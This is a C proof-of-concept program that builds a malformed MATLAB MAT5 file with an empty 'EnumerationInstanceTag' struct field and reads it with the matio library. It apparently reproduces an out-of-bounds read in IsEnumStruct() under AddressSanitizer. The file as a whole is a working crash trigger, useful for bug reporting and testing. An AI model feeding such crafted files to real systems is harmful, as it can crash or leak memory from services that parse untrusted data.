/*
 * PoC: read a crafted MAT5 file whose struct variable carries an
 * "EnumerationInstanceTag" uint32 field with a zero dimension, so the field
 * data buffer holds no elements while the data pointer stays non-NULL.
 * Reading the variable reaches IsEnumStruct() in src/mcos.c, which reads the
 * first 4 bytes of that empty buffer.
 *
 * Build: cc -fsanitize=address -I<src-dir> -I<build-dir> residual.c -o residual -lmatio
 * Usage: ./residual [file.mat]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "matio.h"

static void put_u32(unsigned char **p, unsigned long v)
{
    (*p)[0] = (unsigned char)(v & 0xff);
    (*p)[1] = (unsigned char)((v >> 8) & 0xff);
    (*p)[2] = (unsigned char)((v >> 16) & 0xff);
    (*p)[3] = (unsigned char)((v >> 24) & 0xff);
    *p += 4;
}

static void put_bytes(unsigned char **p, const void *b, size_t n)
{
    memcpy(*p, b, n);
    *p += n;
}

/* Struct "e" with one field "EnumerationInstanceTag":
 * uint32 with dims {0,1} and an empty (0-length) data element. */
static size_t make_mat(unsigned char *buf)
{
    unsigned char *p = buf;
    static const char text[116] =
        "MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Mon Jan  5 10:23:11 2026 "
        "                                       ";
    static const char fname[32] = "EnumerationInstanceTag";

    put_bytes(&p, text, 116);
    put_bytes(&p, "\0\0\0\0\0\0\0\0", 8); /* subsystem data offset */
    put_bytes(&p, "\0\1", 2);             /* version 0x0100        */
    put_bytes(&p, "IM", 2);               /* endian indicator      */

    put_u32(&p, 14);  /* miMATRIX */
    put_u32(&p, 144); /* nbytes   */

    put_u32(&p, 6);  /* array flags: miUINT32 */
    put_u32(&p, 8);
    put_u32(&p, 2); /* class mxSTRUCT_CLASS */
    put_u32(&p, 0);

    put_u32(&p, 5); /* dims: miINT32 */
    put_u32(&p, 8);
    put_u32(&p, 1);
    put_u32(&p, 1);

    put_u32(&p, 0x00010001); /* name "e" packed in the tag */
    put_bytes(&p, "e\0\0\0", 4);

    put_u32(&p, 0x00040005); /* field name length: miINT32, 4 bytes */
    put_u32(&p, 32);

    put_u32(&p, 1); /* field names: miINT8 */
    put_u32(&p, 32);
    put_bytes(&p, fname, 32);

    put_u32(&p, 14); /* field miMATRIX */
    put_u32(&p, 48);

    put_u32(&p, 6);  /* array flags: miUINT32 */
    put_u32(&p, 8);
    put_u32(&p, 13); /* class mxUINT32_CLASS */
    put_u32(&p, 0);

    put_u32(&p, 5); /* dims: miINT32 */
    put_u32(&p, 8);
    put_u32(&p, 0); /* 0 x 1: no elements */
    put_u32(&p, 1);

    put_u32(&p, 1); /* name tag: miINT8, empty */
    put_u32(&p, 0);

    put_u32(&p, 6); /* data: miUINT32, 0 bytes */
    put_u32(&p, 0);

    return (size_t)(p - buf);
}

int main(int argc, char **argv)
{
    const char *path;
    unsigned char buf[512];
    size_t len;
    mat_t *mat;
    matvar_t *var;
    char tmpl[] = "/tmp/matio_enum_tag_XXXXXX.mat";

    len = make_mat(buf);

    if ( argc > 1 ) {
        path = argv[1];
    } else {
        int fd = mkstemps(tmpl, 4);
        if ( fd < 0 || write(fd, buf, len) != (ssize_t)len ) {
            perror("write");
            return 2;
        }
        close(fd);
        path = tmpl;
    }
    printf("crafted file: %s (%zu bytes)\n", path, len);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 2;
    }

    var = Mat_VarRead(mat, "e");
    if ( var != NULL ) {
        printf("read variable \"%s\", class %d\n", var->name, var->class_type);
        Mat_VarFree(var);
    } else {
        printf("variable \"e\" not read\n");
    }

    Mat_Close(mat);
    return 0;
}
